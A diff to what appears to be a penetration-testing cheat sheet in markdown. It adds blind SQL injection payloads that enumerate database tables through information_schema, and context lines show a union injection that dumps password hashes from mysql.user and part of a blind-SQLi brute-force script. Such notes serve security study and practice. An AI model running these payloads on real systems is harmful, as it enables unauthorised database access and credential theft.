@@ -326,9 +326,6 @@ The responder listener will capture the NTMLv2 hash of the Windows target machin
 
 ## SQL Injection
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
-```diff
-- WIP
-```
 
 Simple SQL Injection Log In bypass
 Try a lot of them out:
@@ -402,7 +399,7 @@ Show hostname, user, hashed password of a database from union SQLi:
 php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
 ```
 
-### MSSQL Injection:\
+### MSSQL Injection:
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 
 ### Blind SQL Injection:
@@ -482,6 +479,12 @@ for index in range (1,16): # DB name 15 characters long
 			print("Testing next character: " + dbName + each + '*' )
 print(f"Database name: {dbName}")
 ```
+
+Check for how many table there are in the database: ```' and (select count(*) from information_schema.tables where table_schema='$DBNAME') = 4 -- - ``` \
+Check for the length of the first table: ```' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 7 -- - ``` \
+Check for the length of the second table: ```' and (length((select table_name from information_schema.tables where table_schema=database() limit 2,1))) = 7 -- - ``` \
+Check for the first letter of the first table: ```' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 'p' -- -``` \
+Check for the second letter of the first table: ```' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)) = 'r' -- -``` \
 
 
 ## Serilisation/Deserialisation Exploit
